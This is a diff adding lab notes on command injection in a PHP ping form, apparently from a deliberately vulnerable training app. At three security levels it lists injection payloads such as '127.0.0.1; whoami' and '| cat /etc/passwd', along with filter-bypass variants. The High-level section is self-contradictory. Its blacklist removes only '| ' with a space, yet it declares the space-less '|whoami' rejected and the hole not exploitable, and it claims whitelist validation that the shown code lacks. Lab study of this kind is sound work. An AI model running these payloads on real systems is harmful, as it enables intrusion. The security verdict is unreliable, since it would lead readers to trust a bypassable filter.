@@ -1,0 +1,161 @@
+# Command Injection
+**Security Levels:** Low | Medium | High | Impossible
+
+---
+
+## LOW Level
+
+### Why it is Vulnerable
+
+* User input directly concatenated into OS command
+* No validation or sanitization
+* Dangerous functions used
+* Command output returned to user
+
+---
+
+### Backend Command (Conceptual)
+
+```php
+system("ping -c 4 " . $_GET['ip']);
+```
+
+---
+
+### Payloads (PoC)
+
+```bash
+127.0.0.1; whoami
+```
+
+```bash
+127.0.0.1 && whoami
+```
+```bash
+127.0.0.1 | whoami
+```
+
+```bash
+127.0.0.1 | cat /etc/passwd
+```
+
+---
+
+### Result
+
+* Arbitrary OS command execution
+* Full command output displayed
+
+---
+
+### Severity: **High**
+
+---
+
+## MEDIUM Level
+
+### Why it is Vulnerable
+
+* Blacklist filtering implemented
+* Some characters removed
+* Filtering is incomplete
+* Input still reaches shell
+
+---
+
+### Code Behavior (Conceptual)
+
+```php
+// Set blacklist
+    $substitutions = array(
+        '&&' => '',
+        ';'  => '',
+    );
+```
+
+---
+
+### Payloads (Bypass)
+
+```bash
+127.0.0.1 | whoami
+```
+
+```bash
+127.0.0.1 | cat etc/passwd
+```
+
+---
+
+### Result
+
+* Filters bypassed
+* Commands still executed
+
+---
+
+### Severity: **Medium**
+
+---
+
+## HIGH Level
+
+### Why it is More Secure (But Must Be Tested)
+
+* Whitelist validation used
+* Only IP format allowed
+* Some shell metacharacters blocked
+* Still executes OS command
+
+---
+
+### Code Behavior (Conceptual)
+
+```php
+// Set blacklist
+    $substitutions = array(
+        '||' => '',
+        '&'  => '',
+        ';'  => '',
+        '| ' => '',
+        '-'  => '',
+        '$'  => '',
+        '('  => '',
+        ')'  => '',
+        '`'  => '',
+    );
+```
+
+---
+
+### Payloads 
+
+```bash
+|cat etc/passwd
+```
+
+```bash
+|whoami
+```
+
+---
+
+### Result
+
+* Payloads rejected
+* Input validation blocks execution
+* Only ping command runs
+* No injected command output
+
+---
+
+### Impact
+
+* Command injection **not exploitable**
+* Proper validation prevents attack
+
+---
+
+### Severity: **Low**
+
+---
